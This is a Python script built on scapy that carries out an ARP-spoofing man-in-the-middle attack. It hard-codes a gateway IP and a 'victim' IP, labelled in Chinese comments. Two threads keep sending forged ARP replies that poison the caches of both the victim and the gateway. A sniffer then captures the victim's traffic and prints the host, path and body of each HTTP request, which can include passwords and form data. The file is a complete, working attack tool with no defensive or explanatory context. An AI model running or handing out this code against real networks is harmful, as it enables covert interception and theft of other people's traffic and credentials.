import threading
import time

from scapy.layers import l2, inet, http
from scapy.packet import Packet
from scapy.sendrecv import sniff, sendp

mac_local = l2.Ether().src
ip_gateway = "172.20.10.1"  # 网关IP
mac_gateway = l2.getmacbyip(ip_gateway)
ip_victim = "172.20.10.2"  # 被攻击对象 IP
mac_victim = l2.getmacbyip(ip_victim)

p1_ether = l2.Ether(dst=mac_victim)
p1_arp = l2.ARP(op=2, psrc=ip_gateway, pdst=ip_victim, hwsrc=mac_local)
p2_ether = l2.Ether(dst=mac_gateway)
p2_arp = l2.ARP(op=2, psrc=ip_victim, pdst=ip_gateway, hwsrc=mac_local)


def send_to_victim():
    while True:
        sendp(p1_ether / p1_arp, verbose=False)
        time.sleep(1)


def send_to_gateway():
    while True:
        sendp(p2_ether / p2_arp, verbose=False)
        time.sleep(1)


def packet_filter(p: Packet):
    return p.haslayer(inet.IP) and (p[inet.IP].src == ip_victim or p[inet.IP].dst == ip_victim)


def mitm_attack(p: Packet):
    # if p.haslayer(inet.IP):
    #    print("src: %s, dst: %s" % (p[inet.IP].src, p[inet.IP].dst))
    if p.haslayer(http.HTTPRequest):
        print(p[http.HTTPRequest].fields['Host'], p[http.HTTPRequest].fields['Path'])
        data = p[http.HTTPRequest].payload
        if len(data):
            print(data)


threading.Thread(target=send_to_victim).start()
threading.Thread(target=send_to_gateway).start()
sniff(lfilter=packet_filter, prn=mitm_attack)
